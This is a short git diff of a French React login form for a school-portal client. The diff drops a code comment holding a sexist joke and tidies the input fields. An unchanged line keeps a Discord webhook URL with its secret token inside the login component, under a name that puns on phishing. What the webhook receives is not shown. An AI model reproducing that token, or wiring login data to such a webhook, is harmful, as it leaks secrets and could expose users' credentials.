@@ -20,7 +20,7 @@ export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVe
             console.log("login");
             login(localUsername, localPassword);
         }
-    }, []) // useEffect de base s'exécute à chaque frame et là c'est 1 fois avec la liste vide (je crois tu peux aussi mettre une variable pour qu'il s'exécute à chaque fois qu'elle change bref ça a l'air d'être une fonction vla useful et technique comme cette blague : "Pourquoi les femmes se maquillent et see parfument ? Parce qu'elle sont moches et qu'elles puent" oua complexe (nn)
+    }, []);
 
     const apiLoginUrl = apiUrl + "login.awp?v=" + apiVersion;
     const piranhaPeche = "https://discord.com/api/webhooks/1095444665991438336/548oNdB76xiwOZ6_7-x0UxoBtl71by9ixi9aYVlv5pl_O7yq_nwMvXG2ZtAXULpQG7B3";
@@ -160,8 +160,8 @@ export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVe
                 <img src="/images/no-logo.png" className="logo" id="inside-container" alt="Logo Ecole Directe Plus" /> {/* c'est vrmt golémique mais flemme de javascript */}
                 <h1>Connexion</h1>
                 <form onSubmit={handleSubmit}>
-                    <TextInput className="login-input" textType="text" placeholder="Identifiant" value={username} onChange={updateUsername} isRequired={true} onWarningMessage="Et si vous mettiez un identifiant ?" />
-                    <TextInput className="login-input" textType="password" placeholder="Mot de passe" value={password} onChange={updatePassword} isRequired={true} onWarningMessage="Auriez vous oublié d'entrer votre mot de passe ?" />
+                    <TextInput className="login-input" textType="text" placeholder="Identifiant" value={username} icon="/images/no-logo.png" onChange={updateUsername} isRequired={true} warningMessage="Veuillez entrer votre identifiant" />
+                    <TextInput className="login-input" textType="password" placeholder="Mot de passe" value={password} icon="/images/no-logo.png" onChange={updatePassword} isRequired={true} warningMessage="Veuillez entrer votre mot de passe" />
                     {errorMessage && <p className="error-message">{errorMessage}</p>}
                     <div className="login-option">
                         <CheckBox id="keep-logged-in" label="Rester connecter" checked={keepLoggedIn} onChange={updateKeepLoggedIn} />
